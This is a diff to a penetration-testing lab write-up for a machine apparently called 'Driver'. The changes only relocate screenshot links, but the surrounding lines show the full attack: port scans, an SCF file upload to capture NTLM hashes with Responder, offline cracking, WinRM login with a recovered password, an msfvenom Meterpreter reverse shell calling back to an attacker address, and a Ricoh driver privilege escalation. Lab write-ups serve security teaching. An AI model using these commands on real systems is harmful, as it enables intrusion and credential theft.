@@ -43,7 +43,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.29.215
 ```
 
-![ping](driver_01_ping.png)
+![ping](screenshots/driver_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -61,7 +61,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.29.215 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![allports](driver_02_nmap_allports.png)
+![allports](screenshots/driver_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -69,7 +69,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](driver_03_extractports.png)
+![extractports](screenshots/driver_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -85,8 +85,8 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted 1](driver_04_nmap_targeted_1.png)
-![targeted 2](driver_05_nmap_targeted_2.png)
+![targeted 1](screenshots/driver_04_nmap_targeted_1.png)
+![targeted 2](screenshots/driver_05_nmap_targeted_2.png)
 
 **Findings:**
 
@@ -110,7 +110,7 @@ curl http://10.129.29.215
 curl -I http://10.129.29.215
 ```
 
-![whatweb and curl](driver_06_whatweb_curl.png)
+![whatweb and curl](screenshots/driver_06_whatweb_curl.png)
 
 ### 2.2 Authenticated web surface (MFP portal)
 
@@ -120,7 +120,7 @@ After Basic authentication, open the main site in the browser to confirm the exp
 URL: http://10.129.29.215/index.php
 ```
 
-![web home](driver_08_web_home.png)
+![web home](screenshots/driver_08_web_home.png)
 
 ### 2.3 SMB share listing attempts
 
@@ -131,7 +131,7 @@ smbclient -N -L //10.129.29.215
 smbclient -L //10.129.29.215 -U 'admin%admin'
 ```
 
-![smbclient failures](driver_07_smbclient_failures.png)
+![smbclient failures](screenshots/driver_07_smbclient_failures.png)
 
 ---
 ## 3. Foothold
@@ -147,7 +147,7 @@ sudo nano probe.scf
 cat probe.scf
 ```
 
-![probe.scf contents](driver_09_probe_scf.png)
+![probe.scf contents](screenshots/driver_09_probe_scf.png)
 
 Start Responder on `tun0` and submit the upload through the web form:
 
@@ -155,7 +155,7 @@ Start Responder on `tun0` and submit the upload through the web form:
 sudo responder -I tun0 -w
 ```
 
-![firmware upload and Responder listener](driver_10_fw_up_responder.png)
+![firmware upload and Responder listener](screenshots/driver_10_fw_up_responder.png)
 
 When the victim account authenticates outbound, NetNTLMv2 material is captured:
 
@@ -164,7 +164,7 @@ When the victim account authenticates outbound, NetNTLMv2 material is captured:
 [SMB] NTLMv2-SSP Hash     : tony::DRIVER:<redacted>
 ```
 
-![Responder captured hash](driver_11_responder_hash.png)
+![Responder captured hash](screenshots/driver_11_responder_hash.png)
 
 ### 3.2 Offline cracking and WinRM access
 
@@ -174,7 +174,7 @@ Save the captured hash to a file and crack it offline, then authenticate to WinR
 john --wordlist=/usr/share/wordlists/rockyou.txt tony.ntlmv2
 ```
 
-![john cracked password](driver_12_john_crack.png)
+![john cracked password](screenshots/driver_12_john_crack.png)
 
 **Recovered (redact before publishing):** `tony:liltony` (from the notes capture/crack flow)
 
@@ -182,7 +182,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt tony.ntlmv2
 evil-winrm -i 10.129.29.215 -u 'tony' -p 'liltony'
 ```
 
-![evil-winrm session and user flag](driver_13_evil_winrm_user_flag.png)
+![evil-winrm session and user flag](screenshots/driver_13_evil_winrm_user_flag.png)
 
 🏁 **User flag obtained**
 
@@ -198,7 +198,7 @@ whoami /priv
 Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue | Select-Object -Last 50
 ```
 
-![privileges and printer history hint](driver_14_privesc_enum_history.png)
+![privileges and printer history hint](screenshots/driver_14_privesc_enum_history.png)
 
 ### 4.2 Installed Ricoh printer driver (registry)
 
@@ -218,7 +218,7 @@ Generate a staged payload, upload it to a writable folder, and catch a Meterpret
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.206 LPORT=4444 -f exe -o shell.exe
 ```
 
-![msfvenom shell.exe](driver_15_msfvenom.png)
+![msfvenom shell.exe](screenshots/driver_15_msfvenom.png)
 
 ```powershell
 cd C:\Temp
@@ -228,7 +228,7 @@ upload shell.exe shell.exe
 .\shell.exe
 ```
 
-![upload and execute meterpreter staging binary](driver_16_upload_shell.png)
+![upload and execute meterpreter staging binary](screenshots/driver_16_upload_shell.png)
 
 ```text
 use exploit/multi/handler
@@ -248,8 +248,8 @@ set LPORT 4446
 run
 ```
 
-![meterpreter handler and ricoh privesc success](driver_17_meterpreter_handler.png)
-![ricoh driver privesc module output](driver_18_ricoh_privesc.png)
+![meterpreter handler and ricoh privesc success](screenshots/driver_17_meterpreter_handler.png)
+![ricoh driver privesc module output](screenshots/driver_18_ricoh_privesc.png)
 
 ### 4.4 SYSTEM proof: `root.txt`
 
@@ -263,7 +263,7 @@ dir root.txt
 type root.txt
 ```
 
-![root flag](driver_19_root_flag.png)
+![root flag](screenshots/driver_19_root_flag.png)
 
 🏁 **Root flag obtained**
 
